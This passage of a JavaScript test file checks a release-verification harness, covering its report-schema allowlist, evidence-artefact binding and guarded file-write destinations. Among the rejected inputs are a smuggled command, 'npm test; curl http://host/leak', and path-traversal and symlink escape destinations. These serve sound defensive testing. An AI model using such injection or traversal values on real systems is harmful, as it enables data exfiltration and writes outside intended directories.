    "docs/reviews/2026-08-19-oss-b0-v0.1.0-independent-review.md",
  ]);
  assert.ok(dependenciesPresent(check, closedDependencies()));
  assert.ok(!dependenciesPresent(check, { ...closedDependencies(), "scripts/verify-oss-b0-review.mjs": "" }));
});

test("the ledger this harness names is a name the frozen-record gate will take", () => {
  // Step 9 finding F-8: `docs/reviews` is a frozen-record directory, and
  // `scripts/check-frozen-docs.sh` — a hard step of the merge gate — refuses any
  // file added there whose basename is not dated. A harness that waits for an
  // undated ledger waits for a file that cannot be merged.
  const check = ACCEPTANCE_CHECKS.find((entry) => entry.id === "independent-review");
  const ledger = check.dependencyPaths.find((path) => path.startsWith("docs/reviews/"));
  assert.ok(ledger !== undefined, "the ledger is a declared dependency of this check");
  // The path the checker is run against is the path waited for, not a second one.
  assert.deepEqual(check.commands, [["node", "scripts/verify-oss-b0-review.mjs", ledger]]);

  const frozen = readFileSync(join(REPOSITORY_ROOT, "scripts", "check-frozen-docs.sh"), "utf8");
  // Both halves of the gate's rule, read out of the gate's own source so the two
  // cannot drift apart: which directories are frozen, and what a new name there
  // has to look like.
  assert.match(frozen, /^FROZEN=\(docs\/reviews /mu);
  const dated = /\[\[ "\$\{name\}" =~ \^\(\[0-9\]\{4\}\)-\(\[0-9\]\{2\}\)-\(\[0-9\]\{2\}\)- \]\]/u;
  assert.match(frozen, dated, "the gate still decides new record names by a dated basename");
  assert.match(ledger.slice("docs/reviews/".length), /^\d{4}-\d{2}-\d{2}-/u,
    "the ledger path must be a name the frozen-record gate accepts");
});

test("E12's automated half is the merged fixture-parity pair, and it fails when they stop reading the fixture", () => {
  const parity = ACCEPTANCE_CHECKS.find((check) => check.id === "smoke-fixture-parity");
  assert.deepEqual(parity.evidence, ["E12"]);
  assert.deepEqual(parity.needs, ["api-tests", "web-tests"]);
  assert.equal(checkStage(parity), "automated");

  const green = fullRun();
  assert.equal(green.statusOf("smoke-fixture-parity").status, "verified");
  assert.equal(automatedEvidence(green.run.records).E12, "Verified");

  // A parity suite that no longer loads the frozen fixture passes its own suite
  // and proves nothing; this is the case that must fail.
  const detached = fullRun({
    documents: { "packages/api/src/smoke-fixture.test.ts": "test('nothing', () => {});\n" },
  });
  assert.equal(detached.statusOf("smoke-fixture-parity").status, "refused");
  assert.equal(detached.statusOf("smoke-fixture-parity").reason, "assertion-failed");

  // And a fixture whose no-pull-request field was flipped back to the API default.
  const fixture = JSON.parse(readFileSync(join(REPOSITORY_ROOT, "docs/release/fixtures/oss-b0-smoke-task.json"), "utf8"));
  fixture.task.opensPullRequest = true;
  const flipped = fullRun({
    documents: { "docs/release/fixtures/oss-b0-smoke-task.json": JSON.stringify(fixture) },
  });
  assert.equal(flipped.statusOf("smoke-fixture-parity").status, "refused");
  assert.equal(automatedEvidence(flipped.run.records).E12, undefined);

  // An absent fixture is a dependency, not a failure of this candidate.
  const absent = fullRun({ documents: { "docs/release/fixtures/oss-b0-smoke-task.json": undefined } });
  assert.equal(absent.statusOf("smoke-fixture-parity").status, "pending");
});

// ---------------------------------------------------------------------------
// The report schema, as an allowlist. The disclosure scan is a blacklist and
// cannot recognise a field a future edit adds, so this is the other direction.
// ---------------------------------------------------------------------------

test("a real report satisfies the schema, and the schema is an allowlist", () => {
  const { run } = fullRun();
  const report = reportOf(run);
  assert.deepEqual(reportSchemaViolations(report), []);

  // The run's ownership label names a schema and a temporary directory. Step 8
  // excludes database and container names from the report, so it is not in it —
  // and the schema would refuse it if a future edit put it back.
  assert.equal(report.ownershipLabel, undefined);
  assert.ok(!JSON.stringify(report).includes(run.label));
  assert.deepEqual(reportSchemaViolations({ ...report, ownershipLabel: run.label }), ["unexpected-key"]);

  // A run identifier is a random correlator, never a resource name.
  const first = runIdentifier();
  assert.match(first, /^[0-9a-f]{16}$/u);
  assert.notEqual(first, runIdentifier());
  assert.ok(!ownershipLabel().includes(first));

  // Values outside the closed vocabularies are refused wherever they appear.
  assert.deepEqual(reportSchemaViolations({ ...report, result: "skipped" }), ["value-type"]);
  assert.deepEqual(reportSchemaViolations({ ...report, stage: "whatever" }), ["value-type"]);
  assert.deepEqual(reportSchemaViolations({ ...report, commit: "HEAD" }), ["value-type"]);
  assert.deepEqual(reportSchemaViolations({ ...report, architecture: "arm64 (Apple M4 Max)" }), ["value-type"]);
  assert.deepEqual(reportSchemaViolations({ ...report, commandOrder: ["npm test; curl http://host/leak"] }), ["value-type"]);
  assert.deepEqual(reportSchemaViolations({
    ...report,
    checks: [{ ...report.checks[0], container: "agentos-postgres-1" }],
  }), ["unexpected-key"]);
  assert.deepEqual(reportSchemaViolations({
    ...report,
    checks: [{ ...report.checks[0], status: "skipped" }],
  }), ["value-type"]);
  assert.deepEqual(reportSchemaViolations({
    ...report,
    automatedEvidence: { E3: "Maintainer-verified" },
  }), ["value-type"]);
  assert.deepEqual(reportSchemaViolations({ ...report, automatedEvidence: { E99: "Verified" } }), ["unexpected-key"]);
  const { runId: _dropped, ...withoutRunId } = report;
  assert.deepEqual(reportSchemaViolations(withoutRunId), ["missing-key"]);

  // The violation list is classes only: no key name and no value can ride out on
  // the refusal that was supposed to stop them.
  const violations = reportSchemaViolations({ ...report, leaked: homePath(".agentos", "state.json") });
  assert.deepEqual(violations, ["unexpected-key"]);
  assert.ok(!violations.join(",").includes("Users"));
});

// ---------------------------------------------------------------------------
// The evidence artefact: bound to one release candidate, written only where it
// is allowed to be written, and never over an existing file.
// ---------------------------------------------------------------------------

test("the generated artefact is bound to the exact run that produced it", () => {
  const { run } = fullRun();
  const report = reportOf(run);
  const digest = reportDigest(report);
  const artefact = applyEvidenceHeader(applyAutomatedEvidence(template(), run.records), {
    commit: report.commit,
    architecture: report.architecture,
    osMajor: report.osMajor,
    nodeMajor: report.nodeMajor,
    stage: report.stage,
    result: report.result,
    reportDigest: digest,
  });

  assert.deepEqual(residualPlaceholders(artefact), [],
    "an artefact carrying Verified rows next to <40-hex> is bound to no candidate at all");
  assert.ok(artefact.includes(`- Release candidate commit: \`${report.commit}\``));
  assert.ok(artefact.includes(`\`${report.architecture}\` / \`${report.osMajor}\` / \`${report.nodeMajor}\``));
  assert.ok(artefact.includes(`\`${report.stage}\` / \`${report.result}\``));
  assert.ok(artefact.includes(digest), "the artefact names the exact report bytes it accompanies");
  assert.match(artefact, new RegExp(`schema version ${REPORT_SCHEMA_VERSION}`, "u"));
  assert.equal(digest, reportDigest(report));
  assert.notEqual(digest, reportDigest({ ...report, osMajor: "24" }),
    "a different run is a different digest");

  // The maintainer's own fields are still placeholders: filling those would be
  // this harness signing the other channel's half.
  for (const field of ["<yes/no>", "<name>", "<YYYY-MM-DD>"]) {
    assert.ok(artefact.includes(field), `${field} belongs to the maintainer`);
  }
  // And the template still declares the placeholders this writer must replace.
  const original = template();
  for (const placeholder of HEADER_PLACEHOLDERS) assert.ok(original.includes(placeholder));
  assert.deepEqual(residualPlaceholders(original).sort(), [...HEADER_PLACEHOLDERS].sort());
  assert.deepEqual(forbiddenDisclosures(artefact, []), []);
});

test("an evidence destination is allowlisted, inside the checkout, and never clobbered", () => {
  const accepted = evidenceDestination("docs/release/v0.1.0-evidence.md", { exists: () => false });
  assert.equal(accepted.ok, true);
  assert.ok(accepted.absolute.endsWith("/docs/release/v0.1.0-evidence.md"));
  assert.equal(evidenceDestination("docs/release/v0.1.0-evidence-rc2.md", { exists: () => false }).ok, true);

  for (const destination of [
    "../../outside.md",
    "docs/release/../../outside.md",
    "/etc/oss-b0-evidence.md",
    homePath("evidence", "v0.1.0-evidence.md"),
    "docs/release/v0.1.0-evidence.md.bak",
    "docs/release/evidence.md",
    "docs/v0.1.0-evidence.md",
    "docs/release/v0.1.0-evidence-../escape.md",
    "",
    undefined,
  ]) {
    const refused = evidenceDestination(destination, { exists: () => false });
    assert.equal(refused.ok, false, `${String(destination)} must be refused`);
    assert.equal(refused.reason, "evidence-destination-refused");
    assert.equal(refused.absolute, undefined, "a refused destination is not returned to the caller");
  }

  // No-clobber, including through a broken symlink: `existsSync` says a dangling
  // link is not there, and writing through it would create the file wherever it
  // points.
  const existing = evidenceDestination("docs/release/v0.1.0-evidence.md", { exists: () => true });
  assert.equal(existing.reason, "evidence-destination-refused");
  const dangling = evidenceDestination("docs/release/v0.1.0-evidence.md", {
    exists: () => false,
    linkStatus: (path) => (path.endsWith(".md") ? { isSymbolicLink: () => true } : { isSymbolicLink: () => false }),
  });
  assert.equal(dangling.reason, "evidence-destination-refused");

  // A symlinked parent directory would put the artefact outside the checkout
  // while the relative path still looked local.
  const linkedParent = evidenceDestination("docs/release/v0.1.0-evidence.md", {
    exists: () => false,
    linkStatus: () => { throw new Error("no entry"); },
  });
  assert.equal(linkedParent.reason, "evidence-destination-refused");
  const escapingParent = evidenceDestination("docs/release/v0.1.0-evidence.md", {
    exists: () => false,
    linkStatus: () => ({ isSymbolicLink: () => false }),
    physical: (path) => (path === REPOSITORY_ROOT ? REPOSITORY_ROOT : "/tmp/somewhere-else"),
  });
  assert.equal(escapingParent.reason, "evidence-destination-refused");

  // The pattern itself cannot express a traversal or an absolute path.
  assert.ok(!EVIDENCE_DESTINATION.test("docs/release/../../x.md"));
  assert.ok(!EVIDENCE_DESTINATION.test("/docs/release/v0.1.0-evidence.md"));
});

test("[cli] a traversing evidence destination is refused before anything runs, and is not echoed", () => {
  const started = Date.now();
  const result = runCli(["--evidence-out", "../../oss-b0-outside-evidence.md"]);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /^verify-oss-b0 result=refused reason=evidence-destination-refused$/mu);
  assert.doesNotMatch(result.stdout, /^verify-oss-b0 [a-z-]+=(?:verified|refused|pending|blocked)/mu,
    "no check may run when the destination is already refused");
  assert.ok(!result.stderr.includes("oss-b0-outside-evidence"), "the destination is never echoed back");
  assert.ok(Date.now() - started < 60_000, "the refusal must precede the acceptance commands, not follow them");
  assert.ok(!existsSync(join(REPOSITORY_ROOT, "..", "..", "oss-b0-outside-evidence.md")));
});

test("[cli] an existing artefact is never overwritten", () => {
  const destination = "docs/release/v0.1.0-evidence-clobber-probe.md";
  const absolute = join(REPOSITORY_ROOT, destination);
  writeFileSync(absolute, "prior evidence\n", "utf8");
  try {
    const result = runCli(["--evidence-out", destination]);
    assert.equal(result.status, 1);
    assert.match(result.stderr, /reason=evidence-destination-refused/u);
    assert.equal(readFileSync(absolute, "utf8"), "prior evidence\n", "the file must be untouched");
    assert.ok(!result.stderr.includes("clobber-probe"));
  } finally {
    rmSync(absolute, { force: true });
  }
});

test("the artefact is created exclusively, with the exact bytes, and never twice", () => {
  const directory = mkdtempSync(join(tmpdir(), "oss-b0-evidence-"));
  try {
    const absolute = join(directory, "v0.1.0-evidence.md");
    const artefact = "# evidence\n\n- Release candidate commit: `0000000000000000000000000000000000000000`\n";
    assert.deepEqual(createExclusive(absolute, artefact), { ok: true });
    assert.equal(readFileSync(absolute, "utf8"), artefact, "the bytes on disk are the bytes that were classified");

    // A second write — a re-run, or a race that slipped past the classification —
    // loses to the filesystem rather than to a check.
    const again = createExclusive(absolute, "# a later candidate's evidence\n");
    assert.equal(again.ok, false);
    assert.equal(again.reason, "evidence-destination-refused");
    assert.equal(readFileSync(absolute, "utf8"), artefact, "the first artefact is untouched");

    // And a destination whose parent does not exist is a refusal, not a throw.
    const missing = createExclusive(join(directory, "no-such-directory", "v0.1.0-evidence.md"), artefact);
    assert.equal(missing.reason, "evidence-destination-refused");
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// The published artefacts, at the CLI boundary. The two negatives above this
// section prove the *destination* rules; these two prove what the report may
// carry and what an artefact may not be bound to, measured on a whole run of
// the real script rather than on a constructed report.
//
// Both empty `PATH`, which is the cheapest way to reach the end of a real run:
// every spawned command is unfindable, so the graph completes in seconds and
// still builds, validates and prints a full report. `git` is unfindable too,
// which is what makes the second one possible at all.
// ---------------------------------------------------------------------------

test("[cli] a whole run's report names none of the resources this run created", () => {
  const result = runCli(["--json"], { PATH: "" });
  assert.equal(result.status, 1, "commands that cannot be found are a refusal, not a pass");
  const report = JSON.parse(result.stdout);
  assert.equal(report.harness, "verify-oss-b0");
  assert.equal(report.checks.length, ACCEPTANCE_CHECKS.length, "a whole run reports every check");
  // The label names this run's schema on the database and its workspace under
  // the temporary root. The report is the published half, so it carries the
  // run identifier and not the resource name — and the two are independent, so
  // the identifier does not spell the label out either.
  assert.equal(Object.hasOwn(report, "ownershipLabel"), false);
  assert.match(report.runId, /^[0-9a-f]{16}$/u);
  for (const shape of ["oss-b0-verify-", "verify_oss_b0", tmpdir(), "/Users/", "/home/", "5432"]) {
    assert.ok(!result.stdout.includes(shape), `the report must not carry ${shape}`);
  }
  // Two runs of the same tree agree on everything the schema declares except
  // the identifier: nothing else in the report is per-run state.
  const second = JSON.parse(runCli(["--json"], { PATH: "" }).stdout);
  assert.notEqual(second.runId, report.runId);
  assert.deepEqual({ ...second, runId: null }, { ...report, runId: null });
});

test("[cli] evidence output refuses when the optional public template is absent", () => {
  const destination = "docs/release/v0.1.0-evidence-unbound-probe.md";
  const absolute = join(REPOSITORY_ROOT, destination);
  try {
    // The destination itself is allowlisted and free. The public tree does not
    // ship the maintainer evidence template, so output fails closed.
    assert.ok(!existsSync(absolute), "the probe destination must start free");
    assert.equal(evidenceDestination(destination).ok, true);
    const result = runCli(["--evidence-out", destination], { PATH: "" });
    assert.equal(result.status, 1);
    assert.match(result.stderr, /^verify-oss-b0 result=refused reason=dependency-unavailable detail=evidence-template$/mu);
    assert.ok(!existsSync(absolute), "an artefact without its template is never written");
  } finally {
    rmSync(absolute, { force: true });
  }
});

test("the absent operator rehearsal remains pending rather than simulated", () => {
  const check = ACCEPTANCE_CHECKS.find((entry) => entry.id === "release-migration");
  assert.equal(existsSync(join(REPOSITORY_ROOT, check.dependencyPath)), false);
  assert.equal(dependenciesPresent(check, {}), false);
});
